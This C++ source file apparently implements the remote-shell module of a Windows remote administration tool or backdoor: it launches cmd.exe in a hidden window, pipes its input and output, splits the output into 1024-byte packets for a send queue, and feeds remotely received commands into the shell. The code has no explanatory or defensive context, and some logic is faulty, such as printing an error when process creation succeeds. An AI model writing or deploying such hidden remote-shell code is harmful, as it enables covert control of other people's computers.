#include "stdafx.h"
#include"server_remote_cmd.h"

using namespace std;


RemoteCMD::RemoteCMD(BYTE *inputbuffer, BYTE *outputbuffer, HANDLE sendEvent)
{
	this->sendEvent = sendEvent;
	this->readBuffer = inputbuffer;
	this->writeBuffer = outputbuffer;
}

RemoteCMD::RemoteCMD(int mID)
{
	this->mID = mID;
	this->sendEvent = gExchangeBuffer[mID].sendEvent;
	this->readBuffer = gExchangeBuffer[mID].mainWrite;
	this->writeBuffer = gExchangeBuffer[mID].mainRead;
}

RemoteCMD::~RemoteCMD() 
{
	CloseHandle(push.input);
	CloseHandle(push.output);
	CloseHandle(get.input);
	CloseHandle(get.output);
}


void RemoteCMD::remoteContrl() throw(DWORD)
{
	DWORD written;
	DWORD readed;
	DWORD commandLength;
	DWORD dReader;

	sa.nLength = sizeof(sa);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	if (!CreatePipe(
		&(get.output),
		&(get.input),
		&sa,
		1024
	))
	{
		cout << "Create Get Pipe Failed!\n";
		throw GetLastError();
	}
	if (!CreatePipe(
		&(push.output),
		&(push.input),
		&sa,
		1024
	))
	{
		cout << "Create Push Pipe Failed!\n";
		throw GetLastError();
	}
	si = { sizeof(si) };
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = get.output;
	si.hStdOutput = si.hStdError = push.input;

	wchar_t cmd[] = L"cmd";

	if (CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
	{
		cout << GetLastError();
	}

	CMDMUTEX = true;

	while (CMDMUTEX)
	{	
		Sleep(2000);

		string result;
		char buffer[1024];
		while (PeekNamedPipe(push.output, buffer, 1024, &dReader, NULL, 0))
		{
			if (dReader == 0)
			{
				break;
			}
			memset(buffer, 0, 1024);
			ReadFile(push.output, buffer, dReader, &dReader, NULL);
			result.append(buffer);
		}

		int size = result.size();
		char *rtnData = new char[size];

		ZeroMemory(rtnData, size);
		memcpy(rtnData, result.c_str(), size);

		memcpy(writeBuffer, (BYTE*)&size, 4);
		gExchangeBuffer[mID].sendSize = 1024;
		ResetEvent(sendEvent);
		while (!gQueueAccessLocked)
		{
			gQueueAccessLocked = TRUE;
			gSendDataQueues.push(mID);
			gQueueAccessLocked = FALSE;
			break;
		}
		WaitForSingleObject(sendEvent, INFINITE);

		int packs = size;

		if ((packs % 1024) > 0)
		{
			packs = packs / 1024 + 1;
		}
		else
		{
			packs = packs / 1024;
		}

		for (int i = 0; i < packs; i++)
		{

			ZeroMemory(writeBuffer, 1024);
			if (i != packs - 1)
			{
				memcpy(writeBuffer, &(rtnData[i * 1024]), 1024);
				gExchangeBuffer[mID].sendSize = 1024;
			}
			else
			{
				memcpy(writeBuffer, &(rtnData[i * 1024]), (size - i * 1024));
				gExchangeBuffer[mID].sendSize = (size - i * 1024);
			}

			ResetEvent(sendEvent);
			while (!gQueueAccessLocked)
			{
				gQueueAccessLocked = TRUE;
				gSendDataQueues.push(mID);
				gQueueAccessLocked = FALSE;
				break;
			}
			WaitForSingleObject(sendEvent, INFINITE);
		}
		delete[] rtnData;

		if (GetMessage(&msg, NULL, NULL, NULL))
		{
			switch (msg.message)
			{
			case NEW_CMD_COMMAND:
				WriteFile(get.input, readBuffer, (strlen((char*)readBuffer)), &written, NULL);
				continue;
			default:
				TerminateProcess(pi.hProcess, 0);
				WaitForSingleObject(pi.hProcess, INFINITE);
				CMDMUTEX = false;
				break;
			}
		}
	}
	return;
}